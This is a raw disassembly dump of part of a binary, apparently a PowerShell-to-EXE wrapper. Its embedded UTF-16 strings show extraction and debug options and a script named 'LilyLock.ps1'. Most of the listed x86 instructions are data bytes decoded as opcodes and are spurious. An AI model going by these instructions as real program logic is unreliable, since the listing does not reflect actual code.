  4096c1:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  4096c6:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  4096ca:	00 20                	add    %ah,(%eax)
  4096cc:	00 61 00             	add    %ah,0x0(%ecx)
  4096cf:	64 00 64 00 20       	add    %ah,%fs:0x20(%eax,%eax,1)
  4096d4:	00 61 00             	add    %ah,0x0(%ecx)
  4096d7:	20 00                	and    %al,(%eax)
  4096d9:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  4096dd:	6c                   	insb   (%dx),%es:(%edi)
  4096de:	00 65 00             	add    %ah,0x0(%ebp)
  4096e1:	20 00                	and    %al,(%eax)
  4096e3:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4096e7:	72 00                	jb     0x4096e9
  4096e9:	20 00                	and    %al,(%eax)
  4096eb:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  4096ef:	74 00                	je     0x4096f1
  4096f1:	72 00                	jb     0x4096f3
  4096f3:	61                   	popa
  4096f4:	00 63 00             	add    %ah,0x0(%ebx)
  4096f7:	74 00                	je     0x4096f9
  4096f9:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4096ff:	20 00                	and    %al,(%eax)
  409701:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  409707:	74 00                	je     0x409709
  409709:	68 00 69 00 73       	push   $0x73006900
  40970e:	00 20                	add    %ah,(%eax)
  409710:	00 77 00             	add    %dh,0x0(%edi)
  409713:	61                   	popa
  409714:	00 79 00             	add    %bh,0x0(%ecx)
  409717:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40971c:	00 20                	add    %ah,(%eax)
  40971e:	00 20                	add    %ah,(%eax)
  409720:	00 2d 00 65 00 78    	add    %ch,0x78006500
  409726:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40972a:	00 61 00             	add    %ah,0x0(%ecx)
  40972d:	63 00                	arpl   %eax,(%eax)
  40972f:	74 00                	je     0x409731
  409731:	3a 00                	cmp    (%eax),%al
  409733:	22 00                	and    (%eax),%al
  409735:	3c 00                	cmp    $0x0,%al
  409737:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40973b:	6c                   	insb   (%dx),%es:(%edi)
  40973c:	00 65 00             	add    %ah,0x0(%ebp)
  40973f:	6e                   	outsb  %ds:(%esi),(%dx)
  409740:	00 61 00             	add    %ah,0x0(%ecx)
  409743:	6d                   	insl   (%dx),%es:(%edi)
  409744:	00 65 00             	add    %ah,0x0(%ebp)
  409747:	3e 00 22             	add    %ah,%ds:(%edx)
  40974a:	00 01                	add    %al,(%ecx)
  40974c:	09 2d 00 65 00 6e    	or     %ebp,0x6e006500
  409752:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  409756:	0d 2d 00 64 00       	or     $0x64002d,%eax
  40975b:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40975f:	75 00                	jne    0x409761
  409761:	67 00 01             	add    %al,(%bx,%di)
  409764:	19 4c 00 69          	sbb    %ecx,0x69(%eax,%eax,1)
  409768:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40976c:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  409770:	00 63 00             	add    %ah,0x0(%ebx)
  409773:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  409776:	00 70 00             	add    %dh,0x0(%eax)
  409779:	73 00                	jae    0x40977b
  40977b:	31 00                	xor    %eax,(%eax)
  40977d:	00 2f                	add    %ch,(%edi)
  40977f:	5e                   	pop    %esi
  409780:	00 2d 00 28 00 5b    	add    %ch,0x5b002800
  409786:	00 5e 00             	add    %bl,0x0(%esi)
  409789:	3a 00                	cmp    (%eax),%al
  40978b:	20 00                	and    %al,(%eax)
  40978d:	5d                   	pop    %ebp
  40978e:	00 2b                	add    %ch,(%ebx)
  409790:	00 29                	add    %ch,(%ecx)
  409792:	00 5b 00             	add    %bl,0x0(%ebx)
  409795:	20 00                	and    %al,(%eax)
  409797:	3a 00                	cmp    (%eax),%al
  409799:	5d                   	pop    %ebp
  40979a:	00 3f                	add    %bh,(%edi)
  40979c:	00 28                	add    %ch,(%eax)
  40979e:	00 5b 00             	add    %bl,0x0(%ebx)
  4097a1:	5e                   	pop    %esi
  4097a2:	00 3a                	add    %bh,(%edx)
  4097a4:	00 5d 00             	add    %bl,0x0(%ebp)
  4097a7:	2a 00                	sub    (%eax),%al
  4097a9:	29 00                	sub    %eax,(%eax)
  4097ab:	24 00                	and    $0x0,%al
  4097ad:	01 09                	add    %ecx,(%ecx)
  4097af:	54                   	push   %esp
  4097b0:	00 72 00             	add    %dh,0x0(%edx)
  4097b3:	75 00                	jne    0x4097b5
  4097b5:	65 00 00             	add    %al,%gs:(%eax)
  4097b8:	0b 24 00             	or     (%eax,%eax,1),%esp
  4097bb:	54                   	push   %esp
  4097bc:	00 52 00             	add    %dl,0x0(%edx)
  4097bf:	55                   	push   %ebp
  4097c0:	00 45 00             	add    %al,0x0(%ebp)
  4097c3:	00 0b                	add    %cl,(%ebx)
  4097c5:	46                   	inc    %esi
  4097c6:	00 61 00             	add    %ah,0x0(%ecx)
  4097c9:	6c                   	insb   (%dx),%es:(%edi)
  4097ca:	00 73 00             	add    %dh,0x0(%ebx)
  4097cd:	65 00 00             	add    %al,%gs:(%eax)
  4097d0:	0d 24 00 46 00       	or     $0x460024,%eax
  4097d5:	41                   	inc    %ecx
  4097d6:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  4097da:	00 45 00             	add    %al,0x0(%ebp)
  4097dd:	00 15 4f 00 75 00    	add    %dl,0x75004f
  4097e3:	74 00                	je     0x4097e5
  4097e5:	2d 00 53 00 74       	sub    $0x74005300,%eax
  4097ea:	00 72 00             	add    %dh,0x0(%edx)
  4097ed:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4097f3:	01 0d 53 00 74 00    	add    %ecx,0x740053
  4097f9:	72 00                	jb     0x4097fb
  4097fb:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4097ff:	6d                   	insl   (%dx),%es:(%edi)
  409800:	00 00                	add    %al,(%eax)
  409802:	27                   	daa
  409803:	43                   	inc    %ebx
  409804:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409808:	00 63 00             	add    %ah,0x0(%ebx)
  40980b:	6b 00 20             	imul   $0x20,(%eax),%eax
  40980e:	00 4f 00             	add    %cl,0x0(%edi)
  409811:	4b                   	dec    %ebx
  409812:	00 20                	add    %ah,(%eax)
  409814:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  409818:	00 20                	add    %ah,(%eax)
  40981a:	00 65 00             	add    %ah,0x0(%ebp)
  40981d:	78 00                	js     0x40981f
  40981f:	69 00 74 00 2e 00    	imul   $0x2e0074,(%eax),%eax
  409825:	2e 00 2e             	add    %ch,%cs:(%esi)
  409828:	00 00                	add    %al,(%eax)
  40982a:	2f                   	das
  40982b:	55                   	push   %ebp
  40982c:	00 6e 00             	add    %ch,0x0(%esi)
  40982f:	68 00 61 00 6e       	push   $0x6e006100
  409834:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409838:	00 65 00             	add    %ah,0x0(%ebp)
  40983b:	64 00 20             	add    %ah,%fs:(%eax)
  40983e:	00 65 00             	add    %ah,0x0(%ebp)
  409841:	78 00                	js     0x409843
  409843:	63 00                	arpl   %eax,(%eax)
  409845:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409849:	74 00                	je     0x40984b
  40984b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409851:	20 00                	and    %al,(%eax)
  409853:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  409859:	00 00                	add    %al,(%eax)
  40985b:	00 d9                	add    %bl,%cl
  40985d:	5a                   	pop    %edx
  40985e:	10 a1 3b 05 8b 47    	adc    %ah,0x478b053b(%ecx)
  409864:	8f 08 bc d8          	(bad)
  409868:	f4                   	hlt
  409869:	f8                   	clc
  40986a:	42                   	inc    %edx
  40986b:	ca 00 08             	lret   $0x800
  40986e:	b7 7a                	mov    $0x7a,%bh
  409870:	5c                   	pop    %esp
  409871:	56                   	push   %esi
  409872:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  409875:	89 08                	mov    %ecx,(%eax)
  409877:	31 bf 38 56 ad 36    	xor    %edi,0x36ad5638(%edi)
  40987d:	4e                   	dec    %esi
  40987e:	35 14 00 0a 11       	xor    $0x110a0014,%eax
  409883:	14 10                	adc    $0x10,%al
  409885:	11 0c 0e             	adc    %ecx,(%esi,%ecx,1)
  409888:	18 08                	sbb    %cl,(%eax)
  40988a:	12 21                	adc    (%ecx),%ah
  40988c:	08 12                	or     %dl,(%edx)
  40988e:	21 08                	and    %ecx,(%eax)
  409890:	10 02                	adc    %al,(%edx)
  409892:	11 10                	adc    %edx,(%eax)
  409894:	0c 00                	or     $0x0,%al
  409896:	06                   	push   %es
  409897:	12 18                	adc    (%eax),%bl
  409899:	0e                   	push   %cs
  40989a:	0e                   	push   %cs
  40989b:	0e                   	push   %cs
  40989c:	0e                   	push   %cs
  40989d:	11 25 11 29 03 20    	adc    %esp,0x20032911
  4098a3:	00 01                	add    %al,(%ecx)
  4098a5:	02 06                	add    (%esi),%al
  4098a7:	08 02                	or     %al,(%edx)
  4098a9:	06                   	push   %es
  4098aa:	18 02                	sbb    %al,(%edx)
  4098ac:	06                   	push   %es
  4098ad:	0e                   	push   %cs
  4098ae:	03 06                	add    (%esi),%eax
  4098b0:	11 10                	adc    %edx,(%eax)
  4098b2:	04 01                	add    $0x1,%al
  4098b4:	00 00                	add    %al,(%eax)
  4098b6:	00 04 02             	add    %al,(%edx,%eax,1)
  4098b9:	00 00                	add    %al,(%eax)
  4098bb:	00 04 04             	add    %al,(%esp,%eax,1)
  4098be:	00 00                	add    %al,(%eax)
  4098c0:	00 04 08             	add    %al,(%eax,%ecx,1)
  4098c3:	00 00                	add    %al,(%eax)
  4098c5:	00 04 10             	add    %al,(%eax,%edx,1)
  4098c8:	00 00                	add    %al,(%eax)
  4098ca:	00 04 40             	add    %al,(%eax,%eax,2)
  4098cd:	00 00                	add    %al,(%eax)
  4098cf:	00 04 80             	add    %al,(%eax,%eax,4)
  4098d2:	00 00                	add    %al,(%eax)
  4098d4:	00 04 00             	add    %al,(%eax,%eax,1)
  4098d7:	01 00                	add    %eax,(%eax)
  4098d9:	00 04 00             	add    %al,(%eax,%eax,1)
  4098dc:	02 00                	add    (%eax),%al
  4098de:	00 04 00             	add    %al,(%eax,%eax,1)
  4098e1:	04 00                	add    $0x0,%al
  4098e3:	00 04 00             	add    %al,(%eax,%eax,1)
  4098e6:	08 00                	or     %al,(%eax)
  4098e8:	00 04 00             	add    %al,(%eax,%eax,1)
  4098eb:	10 00                	adc    %al,(%eax)
  4098ed:	00 04 00             	add    %al,(%eax,%eax,1)
  4098f0:	40                   	inc    %eax
  4098f1:	00 00                	add    %al,(%eax)
  4098f3:	04 00                	add    $0x0,%al
  4098f5:	00 02                	add    %al,(%edx)
  4098f7:	00 04 00             	add    %al,(%eax,%eax,1)
  4098fa:	00 04 00             	add    %al,(%eax,%eax,1)
  4098fd:	04 00                	add    $0x0,%al
  4098ff:	00 08                	add    %cl,(%eax)
  409901:	00 04 00             	add    %al,(%eax,%eax,1)
  409904:	00 10                	add    %dl,(%eax)
  409906:	00 03                	add    %al,(%ebx)
  409908:	06                   	push   %es
  409909:	11 14 04             	adc    %edx,(%esp,%eax,1)
  40990c:	00 00                	add    %al,(%eax)
  40990e:	00 00                	add    %al,(%eax)
  409910:	04 c7                	add    $0xc7,%al
  409912:	04 00                	add    $0x0,%al
  409914:	00 04 20             	add    %al,(%eax,%eiz,1)
  409917:	05 00 00 04 90       	add    $0x90040000,%eax
  40991c:	04 00                	add    $0x0,%al
  40991e:	00 04 23             	add    %al,(%ebx,%eiz,1)
  409921:	05 00 00 04 7a       	add    $0x7a040000,%eax
  409926:	00 00                	add    %al,(%eax)
  409928:	00 04 57             	add    %al,(%edi,%edx,2)
  40992b:	00 00                	add    %al,(%eax)
  40992d:	00 04 ec             	add    %al,(%esp,%ebp,8)
  409930:	03 00                	add    (%eax),%eax
  409932:	00 03                	add    %al,(%ebx)
  409934:	06                   	push   %es
  409935:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  40993b:	2d 05 20 01 01       	sub    $0x1012005,%eax
  409940:	11 2d 04 20 00 11    	adc    %ebp,0x11002004
  409946:	31 05 20 01 01 11    	xor    %eax,0x11010120
  40994c:	31 04 20             	xor    %eax,(%eax,%eiz,1)
  40994f:	00 11                	add    %dl,(%ecx)
  409951:	35 05 20 01 01       	xor    $0x1012005,%eax
  409956:	11 35 03 20 00 08    	adc    %esi,0x8002003
  40995c:	04 20                	add    $0x20,%al
  40995e:	01 01                	add    %eax,(%ecx)
  409960:	08 03                	or     %al,(%ebx)
  409962:	06                   	push   %es
  409963:	12 15 0c 20 01 14    	adc    0x1401200c,%dl
  409969:	11 39                	adc    %edi,(%ecx)
  40996b:	02 00                	add    (%eax),%al
  40996d:	02 00                	add    (%eax),%al
  40996f:	00 11                	add    %dl,(%ecx)
  409971:	3d 03 20 00 02       	cmp    $0x2002003,%eax
  409976:	06                   	push   %es
  409977:	20 01                	and    %al,(%ecx)
  409979:	11 41 11             	adc    %eax,0x11(%ecx)
  40997c:	45                   	inc    %ebp
  40997d:	0b 20                	or     (%eax),%esp
  40997f:	04 01                	add    $0x1,%al
  409981:	11 3d 11 35 11 3d    	adc    %edi,0x3d113511
  409987:	11 39                	adc    %edi,(%ecx)
  409989:	07                   	pop    %es
  40998a:	20 02                	and    %al,(%edx)
  40998c:	01 11                	add    %edx,(%ecx)
  40998e:	3d 11 39 0d 20       	cmp    $0x200d3911,%eax
  409993:	02 01                	add    (%ecx),%al
  409995:	11 35 14 11 39 02    	adc    %esi,0x2391114
  40999b:	00 02                	add    %al,(%edx)
  40999d:	00 00                	add    %al,(%eax)
  40999f:	03 20                	add    (%eax),%esp
  4099a1:	00 0e                	add    %cl,(%esi)
  4099a3:	04 20                	add    $0x20,%al
  4099a5:	01 01                	add    %eax,(%ecx)
  4099a7:	0e                   	push   %cs
  4099a8:	04 28                	add    $0x28,%al
  4099aa:	00 11                	add    %dl,(%ecx)
  4099ac:	2d 04 28 00 11       	sub    $0x11002804,%eax
  4099b1:	31 04 28             	xor    %eax,(%eax,%ebp,1)
  4099b4:	00 11                	add    %dl,(%ecx)
  4099b6:	35 03 28 00 08       	xor    $0x8002803,%eax
  4099bb:	03 28                	add    (%eax),%ebp
  4099bd:	00 02                	add    %al,(%edx)
  4099bf:	03 28                	add    (%eax),%ebp
  4099c1:	00 0e                	add    %cl,(%esi)
  4099c3:	04 00                	add    $0x0,%al
  4099c5:	01 18                	add    %ebx,(%eax)
  4099c7:	09 09                	or     %ecx,(%ecx)
  4099c9:	00 04 11             	add    %al,(%ecx,%edx,1)
  4099cc:	49                   	dec    %ecx
  4099cd:	0e                   	push   %cs
  4099ce:	0e                   	push   %cs
  4099cf:	10 0e                	adc    %cl,(%esi)
  4099d1:	02 08                	add    (%eax),%cl
  4099d3:	00 03                	add    %al,(%ebx)
  4099d5:	11 49 0e             	adc    %ecx,0xe(%ecx)
  4099d8:	0e                   	push   %cs
  4099d9:	10 0e                	adc    %cl,(%esi)
  4099db:	0c 00                	or     $0x0,%al
  4099dd:	04 08                	add    $0x8,%al
  4099df:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  4099e4:	51                   	push   %ecx
  4099e5:	08 0e                	or     %cl,(%esi)
  4099e7:	0e                   	push   %cs
  4099e8:	0b 00                	or     (%eax),%eax
  4099ea:	06                   	push   %es
  4099eb:	08 09                	or     %cl,(%ecx)
  4099ed:	09 1d 05 12 21 08    	or     %ebx,0x8211205
  4099f3:	09 07                	or     %eax,(%edi)
  4099f5:	00 03                	add    %al,(%ebx)
  4099f7:	0e                   	push   %cs
  4099f8:	11 55 02             	adc    %edx,0x2(%ebp)
  4099fb:	02 07                	add    (%edi),%al
  4099fd:	00 03                	add    %al,(%ebx)
  4099ff:	11 41 0e             	adc    %eax,0xe(%ecx)
  409a02:	0e                   	push   %cs
  409a03:	02 02                	add    (%edx),%al
  409a05:	06                   	push   %es
  409a06:	02 03                	add    (%ebx),%al
  409a08:	06                   	push   %es
  409a09:	11 41 06             	adc    %eax,0x6(%ecx)
  409a0c:	20 02                	and    %al,(%edx)
  409a0e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  409a11:	59                   	pop    %ecx
  409a12:	03 06                	add    (%esi),%eax
  409a14:	12 5d 07             	adc    0x7(%ebp),%bl
  409a17:	06                   	push   %es
  409a18:	15 12 61 01 11       	adc    $0x11016112,%eax
  409a1d:	34 08                	xor    $0x8,%al
  409a1f:	b0 3f                	mov    $0x3f,%al
  409a21:	5f                   	pop    %edi
  409a22:	7f 11                	jg     0x409a35
  409a24:	d5 0a                	aad    $0xa
  409a26:	3a 06                	cmp    (%esi),%al
  409a28:	20 01                	and    %al,(%ecx)
  409a2a:	11 65 11             	adc    %esp,0x11(%ebp)
  409a2d:	2d 06 20 02 01       	sub    $0x1022006,%eax
  409a32:	1c 12                	sbb    $0x12,%al
  409a34:	69 07 20 02 01 10    	imul   $0x10010220,(%edi),%eax
  409a3a:	11 34 08             	adc    %esi,(%eax,%ecx,1)
  409a3d:	05 20 01 01 12       	add    $0x12010120,%eax
  409a42:	6d                   	insl   (%dx),%es:(%edi)
  409a43:	03 06                	add    (%esi),%eax
  409a45:	12 71 03             	adc    0x3(%ecx),%dh
  409a48:	06                   	push   %es
  409a49:	12 75 05             	adc    0x5(%ebp),%dh
  409a4c:	00 01                	add    %al,(%ecx)
  409a4e:	19 11                	sbb    %edx,(%ecx)
  409a50:	40                   	inc    %eax
  409a51:	05 00 01 11 3c       	add    $0x3c110100,%eax
  409a56:	19 03                	sbb    %eax,(%ebx)
  409a58:	00 00                	add    %al,(%eax)
  409a5a:	02 02                	add    (%edx),%al
  409a5c:	06                   	push   %es
  409a5d:	09 03                	or     %eax,(%ebx)
  409a5f:	06                   	push   %es
  409a60:	11 3c 04             	adc    %edi,(%esp,%eax,1)
  409a63:	03 00                	add    (%eax),%eax
  409a65:	00 00                	add    %al,(%eax)
  409a67:	04 00                	add    $0x0,%al
  409a69:	80 00 00             	addb   $0x0,(%eax)
  409a6c:	03 06                	add    (%esi),%eax
  409a6e:	11 40 04             	adc    %eax,0x4(%eax)
  409a71:	f6 ff                	idiv   %bh
  409a73:	ff                   	(bad)
  409a74:	ff 04 f5 ff ff ff 04 	incl   0x4ffffff(,%esi,8)
  409a7b:	f4                   	hlt
  409a7c:	ff                   	(bad)
  409a7d:	ff                   	(bad)
  409a7e:	ff 03                	incl   (%ebx)
  409a80:	06                   	push   %es
  409a81:	12 1c 12             	adc    (%edx,%edx,1),%bl
  409a84:	20 03                	and    %al,(%ebx)
  409a86:	15 12 79 02 0e       	adc    $0xe027912,%eax
  409a8b:	12 7d 0e             	adc    0xe(%ebp),%bh
  409a8e:	0e                   	push   %cs
  409a8f:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409a94:	80 81 0c 20 04 08 0e 	addb   $0xe,0x804200c(%ecx)
  409a9b:	0e                   	push   %cs
  409a9c:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409aa1:	51                   	push   %ecx
  409aa2:	08 0d 20 06 12 80    	or     %cl,0x80120620
  409aa8:	85 0e                	test   %ecx,(%esi)
  409aaa:	0e                   	push   %cs
  409aab:	0e                   	push   %cs
  409aac:	0e                   	push   %cs
  409aad:	11 25 11 29 09 20    	adc    %esp,0x20092911
  409ab3:	04 12                	add    $0x12,%al
  409ab5:	80 85 0e 0e 0e 0e 04 	addb   $0x4,0xe0e0e0e(%ebp)
  409abc:	20 00                	and    %al,(%eax)
  409abe:	12 11                	adc    (%ecx),%dl
  409ac0:	05 20 00 12 80       	add    $0x80120020,%eax
  409ac5:	89 08                	mov    %ecx,(%eax)
  409ac7:	20 03                	and    %al,(%ebx)
  409ac9:	01 11                	add    %edx,(%ecx)
  409acb:	2d 11 2d 0e 03       	sub    $0x30e2d11,%eax
  409ad0:	06                   	push   %es
  409ad1:	12 30                	adc    (%eax),%dh
  409ad3:	06                   	push   %es
  409ad4:	20 02                	and    %al,(%edx)
  409ad6:	01 0a                	add    %ecx,(%edx)
  409ad8:	12 6d 04             	adc    0x4(%ebp),%ch
  409adb:	28 00                	sub    %al,(%eax)
  409add:	12 11                	adc    (%ecx),%dl
  409adf:	03 06                	add    (%esi),%eax
  409ae1:	12 50 03             	adc    0x3(%eax),%dl
  409ae4:	06                   	push   %es
  409ae5:	12 44 04 06          	adc    0x6(%esp,%eax,1),%al
  409ae9:	12 80 8d 04 06 11    	adc    0x1106048d(%eax),%al
  409aef:	80 91 07 20 02 01 12 	adcb   $0x12,0x1022007(%ecx)
  409af6:	50                   	push   %eax
  409af7:	12 44 04 20          	adc    0x20(%esp,%eax,1),%al
  409afb:	00 12                	add    %dl,(%edx)
  409afd:	7d 03                	jge    0x409b02
  409aff:	06                   	push   %es
  409b00:	12 7d 05             	adc    0x5(%ebp),%bh
  409b03:	20 00                	and    %al,(%eax)
  409b05:	12 80 8d 05 20 00    	adc    0x20058d(%eax),%al
  409b0b:	11 80 91 04 20 00    	adc    %eax,0x200491(%eax)
  409b11:	12 19                	adc    (%ecx),%bl
  409b13:	05 20 00 12 80       	add    $0x80120020,%eax
  409b18:	95                   	xchg   %eax,%ebp
  409b19:	04 28                	add    $0x28,%al
  409b1b:	00 12                	add    %dl,(%edx)
  409b1d:	7d 05                	jge    0x409b24
  409b1f:	28 00                	sub    %al,(%eax)
  409b21:	12 80 8d 05 28 00    	adc    0x28058d(%eax),%al
  409b27:	11 80 91 04 28 00    	adc    %eax,0x280491(%eax)
  409b2d:	12 19                	adc    (%ecx),%bl
  409b2f:	05 28 00 12 80       	add    $0x80120028,%eax
  409b34:	95                   	xchg   %eax,%ebp
  409b35:	05 20 01 01 12       	add    $0x12010120,%eax
  409b3a:	44                   	inc    %esp
  409b3b:	04 20                	add    $0x20,%al
  409b3d:	01 01                	add    %eax,(%ecx)
  409b3f:	02 05 00 01 08 1d    	add    0x1d080100,%al
  409b45:	0e                   	push   %cs
  409b46:	07                   	pop    %es
  409b47:	00 02                	add    %al,(%edx)
  409b49:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  409b4c:	80 99 06 20 01 01 11 	sbbb   $0x11,0x1012006(%ecx)
  409b53:	80 a1 01 02 01 15 05 	andb   $0x5,0x15010201(%ecx)
  409b5a:	20 02                	and    %al,(%edx)
  409b5c:	01 0e                	add    %ecx,(%esi)
  409b5e:	08 04 00             	or     %al,(%eax,%eax,1)
  409b61:	01 02                	add    %eax,(%edx)
  409b63:	0e                   	push   %cs
  409b64:	06                   	push   %es
  409b65:	10 01                	adc    %al,(%ecx)
  409b67:	01 08                	add    %ecx,(%eax)
  409b69:	1e                   	push   %ds
  409b6a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409b6d:	01 11                	add    %edx,(%ecx)
  409b6f:	0c 0f                	or     $0xf,%al
  409b71:	07                   	pop    %es
  409b72:	07                   	pop    %es
  409b73:	12 21                	adc    (%ecx),%ah
  409b75:	12 21                	adc    (%ecx),%ah
  409b77:	11 0c 02             	adc    %ecx,(%edx,%eax,1)
  409b7a:	11 10                	adc    %edx,(%eax)
  409b7c:	11 14 12             	adc    %edx,(%edx,%edx,1)
  409b7f:	18 06                	sbb    %al,(%esi)
  409b81:	20 01                	and    %al,(%ecx)
  409b83:	01 11                	add    %edx,(%ecx)
  409b85:	80 dd 05             	sbb    $0x5,%ch
  409b88:	20 02                	and    %al,(%edx)
  409b8a:	01 08                	add    %ecx,(%eax)
  409b8c:	08 04 20             	or     %al,(%eax,%eiz,1)
  409b8f:	01 01                	add    %eax,(%ecx)
  409b91:	0d 08 14 11 39       	or     $0x39111408,%eax
  409b96:	02 00                	add    (%eax),%al
  409b98:	02 00                	add    (%eax),%al
  409b9a:	00 07                	add    %al,(%edi)
  409b9c:	20 02                	and    %al,(%edx)
  409b9e:	10 11                	adc    %dl,(%ecx)
  409ba0:	39 08                	cmp    %ecx,(%eax)
  409ba2:	08 0b                	or     %cl,(%ebx)
  409ba4:	20 04 01             	and    %al,(%ecx,%eax,1)
  409ba7:	03 11                	add    (%ecx),%edx
  409ba9:	2d 11 2d 11 80       	sub    $0x80112d11,%eax
  409bae:	e9 0c 07 03 14       	jmp    0x1443a2bf
  409bb3:	11 39                	adc    %edi,(%ecx)
  409bb5:	02 00                	add    (%eax),%al
  409bb7:	02 00                	add    (%eax),%al
  409bb9:	00 08                	add    %cl,(%eax)
  409bbb:	08 04 07             	or     %al,(%edi,%eax,1)
  409bbe:	01 11                	add    %edx,(%ecx)
  409bc0:	35 04 07 01 11       	xor    $0x11010704,%eax
  409bc5:	31 05 00 00 12 80    	xor    %eax,0x80120000
  409bcb:	ed                   	in     (%dx),%eax
  409bcc:	05 20 02 01 0c       	add    $0xc010220,%eax
  409bd1:	0c 06                	or     $0x6,%al
  409bd3:	20 01                	and    %al,(%ecx)
  409bd5:	01 11                	add    %edx,(%ecx)
  409bd7:	80 f1 06             	xor    $0x6,%cl
  409bda:	20 01                	and    %al,(%ecx)
  409bdc:	01 11                	add    %edx,(%ecx)
  409bde:	80 f9 06             	cmp    $0x6,%cl
  409be1:	20 01                	and    %al,(%ecx)
  409be3:	01 11                	add    %edx,(%ecx)
  409be5:	81 05 08 00 01 12 81 	addl   $0x80120981,0x12010008
  409bec:	09 12 80 
  409bef:	e5 05                	in     $0x5,%eax
  409bf1:	20 00                	and    %al,(%eax)
  409bf3:	11 81 0d 06 20 01    	adc    %eax,0x120060d(%ecx)
  409bf9:	01 11                	add    %edx,(%ecx)
  409bfb:	81 11 05 20 00 12    	adcl   $0x12002005,(%ecx)
  409c01:	81 15 06 20 01 01 12 	adcl   $0x7e58012,0x1012006
  409c08:	80 e5 07 
  409c0b:	20 04 01             	and    %al,(%ecx,%eax,1)
  409c0e:	08 08                	or     %cl,(%eax)
  409c10:	08 08                	or     %cl,(%eax)
  409c12:	04 00                	add    $0x0,%al
  409c14:	01 0e                	add    %ecx,(%esi)
  409c16:	18 05 20 01 01 11    	sbb    %al,0x11010120
  409c1c:	49                   	dec    %ecx
  409c1d:	05 00 02 08 08       	add    $0x8080200,%eax
  409c22:	08 07                	or     %al,(%edi)
  409c24:	20 01                	and    %al,(%ecx)
  409c26:	01 1d 12 80 e5 06    	add    %ebx,0x6e58012
  409c2c:	20 01                	and    %al,(%ecx)
  409c2e:	01 11                	add    %edx,(%ecx)
  409c30:	81 1d 06 20 01 01 11 	sbbl   $0x5218111,0x1012006
  409c37:	81 21 05 
  409c3a:	00 00                	add    %al,(%eax)
  409c3c:	12 81 25 06 00 01    	adc    0x1000625(%ecx),%al
  409c42:	12 81 29 0e 06 20    	adc    0x20060e29(%ecx),%al
  409c48:	01 01                	add    %eax,(%ecx)
  409c4a:	12 81 29 06 20 01    	adc    0x1200629(%ecx),%al
  409c50:	01 12                	add    %edx,(%edx)
  409c52:	81 2d 04 20 00 11 49 	subl   $0xa071a49,0x11002004
  409c59:	1a 07 0a 
  409c5c:	12 15 12 71 12 80    	adc    0x80127112,%dl
  409c62:	fd                   	std
  409c63:	12 81 01 12 81 01    	adc    0x1811201(%ecx),%al
  409c69:	0e                   	push   %cs
  409c6a:	0e                   	push   %cs
  409c6b:	11 49 11             	adc    %ecx,0x11(%ecx)
  409c6e:	81 0d 1d 12 80 e5 06 	orl    $0x4d121506,0xe580121d
  409c75:	15 12 4d 
  409c78:	01 12                	add    %edx,(%edx)
  409c7a:	51                   	push   %ecx
  409c7b:	09 20                	or     %esp,(%eax)
  409c7d:	00 15 12 81 39 01    	add    %dl,0x1398112
  409c83:	13 00                	adc    (%eax),%eax
  409c85:	07                   	pop    %es
  409c86:	15 12 81 39 01       	adc    $0x1398112,%eax
  409c8b:	12 51 04             	adc    0x4(%ecx),%dl
  409c8e:	20 00                	and    %al,(%eax)
  409c90:	13 00                	adc    (%eax),%eax
  409c92:	07                   	pop    %es
  409c93:	20 02                	and    %al,(%edx)
  409c95:	01 12                	add    %edx,(%edx)
  409c97:	80 e5 0e             	and    $0xe,%ch
  409c9a:	25 07 0f 12 15       	and    $0x15120f07,%eax
  409c9f:	1d 12 81 31 12       	sbb    $0x12318112,%eax
  409ca4:	81 35 12 81 01 08 08 	xorl   $0x8711208,0x8018112
  409cab:	12 71 08 
  409cae:	08 12                	or     %dl,(%edx)
  409cb0:	51                   	push   %ecx
  409cb1:	08 08                	or     %cl,(%eax)
  409cb3:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409cb9:	15 12 81 39 01       	adc    $0x1398112,%eax
  409cbe:	12 51 06             	adc    0x6(%ecx),%dl
  409cc1:	07                   	pop    %es
  409cc2:	02 12                	add    (%edx),%dl
  409cc4:	21 1d 05 09 07 03    	and    %ebx,0x3070905
  409cca:	12 2c 12             	adc    (%edx,%edx,1),%ch
  409ccd:	71 11                	jno    0x409ce0
  409ccf:	81 0d 05 20 02 01 1c 	orl    $0x2006181c,0x1022005
  409cd6:	18 06 20 
  409cd9:	01 01                	add    %eax,(%ecx)
  409cdb:	12 81 49 04 20 00    	adc    0x200449(%ecx),%al
  409ce1:	11 55 04             	adc    %edx,0x4(%ebp)
  409ce4:	20 01                	and    %al,(%ecx)
  409ce6:	03 08                	add    (%eax),%ecx
  409ce8:	04 20                	add    $0x20,%al
  409cea:	01 01                	add    %eax,(%ecx)
  409cec:	03 06                	add    (%esi),%eax
